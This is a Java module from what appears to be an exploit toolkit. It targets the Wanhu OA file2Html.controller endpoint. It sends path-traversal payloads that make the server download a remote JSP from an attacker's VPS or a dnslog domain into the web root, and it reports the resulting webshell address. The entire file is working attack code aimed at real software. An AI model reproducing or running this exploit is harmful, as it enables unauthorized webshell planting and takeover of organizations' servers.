package exp.oa.wanhuoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.Date;
import java.util.HashMap;

public class wanhu_file2Html_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url,textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }
    private Boolean att(String url, TextArea textArea) {
        String tt = "R4gT"+(new Date()).getTime();
        HashMap<String, String> head = new HashMap<>();
        String payload = "fileName="+tt+".jsp&path=../platform/portal/&url=";

        Response response = HttpTools.post(url + "/defaultroot/yzConvertFile/file2Html.controller", payload, head, "utf-8");
        if (response.getCode() == 200 ) {
            Platform.runLater(() -> {
                textArea.appendText("\n [ wanhu_file2Html_upload ]");
                textArea.appendText("\n 探测接口存在,上传类型:远程下载文件\n" +
                        "(1) dnslog测试,eg: dnslog.cn\n" +
                        "(2) vps远程下载,ge: http://vps:port/1.jsp\n");
                textArea.appendText("\n ");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n");
            });
            return false;
        }
    }

    private Boolean attcmd(String url,String cmd, TextArea textArea,TextArea textArea_cmd) {
        String tt = "R4gS"+(new Date()).getTime();
        HashMap<String, String> head = new HashMap<>();
        if(!cmd.contains("http://")){
            if(cmd.contains("dnslog")){
                cmd = "http://R4gTest."+cmd;
            }else{
                cmd = "http://"+cmd;
            }
        }
        String finalCmd = cmd;
        String payload = "fileName="+tt+".jsp&path=../platform/portal/&url="+finalCmd;

        Response response = HttpTools.post(url + "/defaultroot/yzConvertFile/file2Html.controller", payload, head, "utf-8");
        if (response.getCode() == 200 ) {
            if(finalCmd.contains("dnslog")){
                Platform.runLater(() -> {
                    textArea.appendText("\n dnslog地址:\n " + finalCmd);
                });
                return true;
            }
            Platform.runLater(() -> {
                textArea.appendText("\n 上传地址:\n " + url + "/platform/portal/"+tt+".jsp");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell写入失败");
            });
            return false;
        }
    }
}
